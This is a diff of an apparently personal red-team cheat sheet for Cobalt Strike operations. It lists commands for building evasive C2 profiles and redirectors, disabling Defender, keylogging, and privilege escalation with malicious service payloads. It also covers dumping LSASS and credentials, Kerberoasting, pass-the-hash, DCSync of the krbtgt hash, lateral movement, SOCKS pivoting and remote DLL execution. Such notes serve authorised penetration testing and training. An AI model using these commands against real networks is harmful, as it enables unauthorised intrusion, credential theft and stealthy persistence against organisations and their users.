@@ -43,7 +43,7 @@ mv arsenal-kit /opt/cobaltstrike/
 # Create a random C2 profile
 
 - Option 1
-cd /opt/cobaltstrike/third-party/tylous-sourcepoint
+cd /opt/cobaltstrike/third-party/tylous-sourcepoint/
 go build SourcePoint.go
 ./SourcePoint -Host <IP> -Injector VirtualAllocEx -Outfile <name>.profile
 
@@ -54,6 +54,8 @@ chmod 755 install.sh
 C2concealer --variant 3 --hostname target.com
 Answer the questions.
 This will create a random.profile.
+
+Run c2lint against your new profile to check for any possible OPSEC issues.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # OPSEC: If you manually create a new C2 profile, change the following options:
@@ -112,8 +114,6 @@ stage {
     set name             "changeme.dll";
 }
 
-Run c2lint against your new profile to check for possible OPSEC issues.
-
 Review /opt/cobaltstrike/malleable-c2-profiles/normal/reference.profile for more default settings.
 
 See also:
@@ -167,15 +167,14 @@ Redirector 2 - domain2
 Redirector 3 - DNS (long haul)
 
 - Install socat on each instance
+Forwards all traffic on these ports. This is not OPSEC friendly.
 sudo -i
 apt-get install -y socat
 screen -S lee
 socat tcp4-listen:443,fork tcp4:<team server IP>:443        Redirector 1/2
 socat -T 5 udp4-listen:53,fork udp4:<team server IP>:53     Redirector 3
-------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Valid SSL certificate for Beacon 
-
+- Create SSL certificates for https redirectors
 Create a Java Keystore file. Use the fully qualified domain name of your Beacon server.
 keytool -genkey -keyalg RSA -keysize 2048 -keystore domain.store
 
@@ -191,6 +190,9 @@ keytool -import -trustcacerts -alias mykey -file domain.crt -keystore domain.sto
  
 Cobalt Strike expects to find the Java Keystore file in the same folder as your Malleable C2 profiles.
 /opt/cobaltstrike/malleable-c2-profiles
+
+Pro Tip: Use the following repo to automate your infrastructure setup.
+https://github.com/ezra-buckingham/terry-the-terraformer
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Create listeners
@@ -236,9 +238,9 @@ In graph mode, TCP Beacon are shown in green and SMB Beacons are shown in yellow
 
 OPSEC: Staged payloads tend to have more indicators compared to stageless.
 Always prefer a fully staged or stageless payload and disable payload staging.
-(S) in the framework refers to a stageless payload.
+(S) in Cobalt Strike refers to a stageless payload.
 
-- Disable Windows Defender on your target Windows VM
+- Disable Windows Defender on your target Windows VM (home testing)
 Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
 Standard: Windows Defender settings > turn off Real-time protection
 
@@ -298,6 +300,9 @@ Use the up arrow to scroll through previous commands.
 All commands and their output are written to the logs directory.
 Right-click on the X in the tab for additional options.
 https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm
+
+Select a particular Beacon > exit                 Beacon will no longer check in
+Right-click on the Beacon > Session > Remove      Remove dead Beacon
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Situational awareness
@@ -332,16 +337,18 @@ net computers                                     Show doamin computers (this ca
 
 View > Targets                                    Discovered targets will populate
 
-ps                                                Show process list
+ps                                                Show process list. Look for another user that is logged in
+inject <PID> <x86|x64> <listener>
 
-screenshot <PID> x64                              Take a single screenshot (look for svchost from the current user)
+screenshot <PID> x64                              Take a single screenshot (look for svchost running on the current user)
                                                   View > Screenshots
 
-keylogger <PID> x64                               Start a keystroke logger (look for svchost from the current user)
+keylogger <PID> x64                               Start a keystroke logger (look for svchost running on the current user)
                                                   View > Keystrokes
 
 Right-click on the Beacon > Explore > File Browser
 Right-click on a file > Download
+View > Downloads > select a file > Sync Files     Save downloaded file to your local VM
 
 portscan <target range> <ports> none 255          Scan a network for open services
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -352,6 +359,27 @@ getsystem                                         BOF - Attemp to get SYSTEM
 getprivs                                          Enable system privileges on current token
 getuid                                            Get User ID
 
+Cobalt Strike > Script Manger > Load
+/opt/cobaltstrike/third-party/trustedsec-remote-ops/Injection/Injection.cna
+/opt/cobaltstrike/third-party/trustedsec-remote-ops/Remote/Remote.cna
+
+- Seatbelt
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q DotNet                 Check for versions 2 and 3.5
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q PowerShell             Check for version 2
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q InterestingProcesses
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q WindowsDefender        Look for path exclusions
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=all                All commands
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=user               User behavior-focused commands
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=system             System profiling
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=slack              Slack-specific modules
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=chromium           Chromium-specific modules
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=remote             Modules useful for remote enumeration
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=misc               Everything else
+
+- Analyze the attack surface of a host with the following Seatbelt modules:
+AutoRus, EnvironmentPath, EnvironmentVariables, FileInfo, Fileinfo, Hotfixes, InstalledProducts, MicrosoftUpdates,
+NamedPipes, OSInfo, reg, RPCMappedEndpoints, ScheduledTasks, Services, TcpConnections, and UdpConnections
+
 - PowerUp
 powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
 powerpick Invoke-PrivescAudit; "done"             Look for a vulnerable service
@@ -360,18 +388,8 @@ Output: Windows Service EXE
 Use the same name of the vulnerable service binary
 cd to the vulnerable binary location
 upload /path/to/new/payload
-sc_stop <vuln service name>                       If the vulnerable service is running, stop it
-sc_start <vuln service name>                      Start the vulnerable service, which runs the malicious payload
-
-- Seatbelt
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe PowerShell
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe DotNet
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=user
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=system
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=slack
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=chromium
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=remote
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=misc
+sc_stop <vuln service name>                       BOF - If the vulnerable service is running, stop it
+sc_start <vuln service name>                      BOF - Start the vulnerable service, which runs the malicious payload
 
 - SharpUp
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe audit
@@ -387,11 +405,12 @@ prodump <PID of lsass.exe> <C:/Temp/dump.txt>     BOF - Dumps the specified proc
 Right-click on the Beacon > Explore > File Browser
 Browse to the same location as the dump
 Right-click on the file > Download
+View > Downloads > select a file > Sync Files     Save downloaded file to your local VM
 
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe CredGuard
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe KeePass
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe LSASettings
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe SecPackageCreds
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q CredGuard
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q KeePass
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q LSASettings
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q SecPackageCreds
 
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe dump
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe logonsession
@@ -407,20 +426,6 @@ pth <domain\user> <hash>
 spawnas <domain\user> <password> <listener>
 Using Rubeus to request/apply a new ticket
 kerberos_ticket_use (with an existing ticket)
-
-- Mimikatz
-::                                                Show parent modules
-sekurlsa::                                        Show submodules for a given parent
-privilege::debug
-token::elevate
-sekurlsa::logonPasswords
-
-lsadump::<module>                                 Interact with the Local Security Authority (LSA)
-    ::sam                                         Local account hashes from the SAM database using the registry
-    ::lsa                                         Local account hashes via the LSA APIs (and domain hashes on DCs)
-    ::cache                                       Domain cached credentials on the system
-    ::secrets                                     LSA Secrets (ex: service account passwords)
-    ::dcsync /user:<domain\user>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Lateral movement
@@ -429,51 +434,38 @@ Right-click on a SYSTEM Beacon > Access > Make Token
 Select a user > Build
 
 powershell-import /opt/PowerSploit/Recon/PowerView.ps1
-powerpick Get-DomainUser <user>                   Show groups a user belongs to
-powerpick Get-DomainComputer -Ping -Properties dnshostname; "done"
-powerpick Get-NetLocalGroupMember <FQDN>          List users the administrator group on a remote computer
+powerpick Get-DomainUser <user>; "done"           Show groups a user belongs to
+powerpick Get-NetLocalGroupMember <FQDN>; "done"  List users in the administrator group on a remote computer
+powerpick Get-DomainComputer -Ping -Properties dnshostname; "done"   Show domain computers
+powerpick Get-DomainUser-SPN -Properties samaccountname, serviceprincipalnaame; "done"
+powerpick Invoke-Kerberoast <samaccountname> | fl
 
-ls \\<FQDN>\C$                                    BOF - Check to see if you have access
+Copy the hash and crack with john.
+make_token domain\user <password>
+dir \\<FQDN>\C$\                                  BOF - Check to see if you have access (include the trailing backslash)
 
-jump <psexec, psexec64, psexec_psh, winrm, winrm64> <computer> <listener>
+jump <psexec, psexec64, psexec_psh, winrm, winrm64> <FQDN> <smb listener>
 
-schtasks /create /s <IP> /tn <name> /u <user> /sc <frequency> /p <password> /st <time> /sd <date> <command>
-sc \\IP create Service binPath= "command"
-wmic /node:target.domain process call create "C:\Windows\System32\cmd.exe /c beacon.exe"
+pth domain\user <hash>
+dir \\<FQDN>\C$\                                  BOF - Check to see if you have access (include the trailing backslash)
 
-jump wmi_msbuild <target> <listener>
+dcsync <FQDN DC> doamin\krbtgt                    Grab the NTLM hash
 
-socks <port>                                      Opens a port on the team server. Be sure to restrict access
+powerpick Get-Domain                              Show the current domain
+powerpick Get-DomainTrust                         Show trust type and direction
+powerpick Get-DomainTrust -LDAP
+powerpick Get-ForestTrust
+powerpick Get-DomainComputer -Domain <other domain> -Ping -Properties dnshostname
+powerpick Get-DomainController -Domain <other domain>
+powerpick Get-NetLocalGroupMember <other FQDN DC>
+powerpick Get-DomainForeignGroupMember -Domain <other domain>
+powerpick "<MemberName>" | ConvertFrom-SID
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# SOCKS proxy
+
+sleep 0                                           Make a Beacon interactive
+socks <port>                                      Start a SOCKS4a proxy server on the team server (example 8080)
+/etc/proxychains4.conf                            Edit your attack VM’s config at the bottom with the team server IP and proxy port
 proxychains <tool/options>
-/etc/proxychains.conf                             Edit your attack VM’s config to your team server IP and port
 proxychains xfreerdp /u:<domain\user> /p:<password> /v:<IP>
-
-jump psexec                                       Run service EXE on remote host
-jump psexec_psh                                   Run a PowerShell one-liner on remote host via a service
-jump winrm                                        Run a PowerShell script via WinRM on remote host
-remote-exec <any of the above>                    Run a single command using the above methods on remote host
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Process injection
-
-ps                                                Look for another user that is logged in
-inject <PID> <arch> <listener>
-dllinject <PID>                                   Reflective DLL injection
-dllload <PID>                                     Loading an on-disk DLL to memory
-spawnto <arch> <full-exe-path>                    Process hollowing
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Remotely execute a DLL
-
-upload /tmp/beacon.dll                            Upload your malicious DLL
-ls                                                Verify it was uploadted
-remote-exec wmi <FQDN> rundll32 c:\windows\temp\beacon.dll,start
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Clean up
-
-Select a particular Beacon > exit                 Beacon to no longer check in
-Right click on the Beacon > Session > Remove      Remove the dead Beacon
-
-Site Management > Manage
-Select each line > Kill                           Remove any Scripted Payload Delivery
